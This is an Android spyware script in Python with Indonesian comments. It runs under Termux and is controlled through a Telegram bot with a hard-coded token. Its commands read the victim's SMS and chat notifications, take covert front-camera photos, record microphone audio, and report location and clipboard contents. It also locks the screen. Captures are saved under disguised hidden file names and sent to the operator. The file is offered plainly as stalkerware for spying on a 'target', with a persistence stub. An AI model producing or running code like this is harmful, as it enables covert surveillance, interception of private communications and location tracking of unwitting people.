import os, time, subprocess, requests
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# GANTI DENGAN TOKEN LU
TOKEN = "8506998109:AAHnW8fkIm-7FrPG-oxxQZrQ1NnRgreuiho"

def bot_engine(update, context):
    cmd = update.message.text
    chat_id = update.effective_chat.id

    # --- FITUR SADAP SOSMED & SMS ---
    if cmd == '📩 BACA SMS':
        # Menarik SMS via Termux-API engine yang tertanam
        out = subprocess.getoutput("termux-sms-list -l 10")
        update.message.reply_text(f"📩 **SMS Terakhir:**\n{out}")

    elif cmd == '📱 SADAP WA/IG':
        # Mengambil snapshot notifikasi aktif
        out = subprocess.getoutput("termux-notification-list")
        update.message.reply_text(f"👁️ **Notifikasi Chat Masuk:**\n{out}")

    # --- FITUR MATA-MATA VISUAL ---
    elif cmd == '📸 FOTO DEPAN':
        path = "/sdcard/.sys_temp_cam.jpg"
        os.system(f"termux-camera-photo -c 1 {path}")
        context.bot.send_photo(chat_id=chat_id, photo=open(path, 'rb'))
        os.remove(path)

    elif cmd == '🎙️ SADAP SUARA':
        path = "/sdcard/.sys_audio.mp3"
        os.system(f"termux-microphone-record -d 15 -f {path}")
        time.sleep(16)
        context.bot.send_audio(chat_id=chat_id, audio=open(path, 'rb'))
        os.remove(path)

    # --- FITUR KONTROL SISTEM ---
    elif cmd == '📍 LOKASI':
        loc = subprocess.getoutput("termux-location")
        update.message.reply_text(f"📍 **Posisi Target:**\n{loc}")

    elif cmd == '📋 CLIPBOARD':
        clip = subprocess.getoutput("termux-clipboard-get")
        update.message.reply_text(f"📋 **Data Salinan:** {clip}")

    elif cmd == '🔒 LOCK DEVICE':
        # Perintah admin untuk kunci layar (butuh izin admin)
        os.system("input keyevent 26")
        update.message.reply_text("🔒 Layar dipaksa mati/kunci.")

# Fungsi agar aplikasi jalan otomatis di background (Persistence)
def start_persistence():
    while True:
        # Memastikan koneksi bot tetep nyala walau HP sleep
        time.sleep(60)
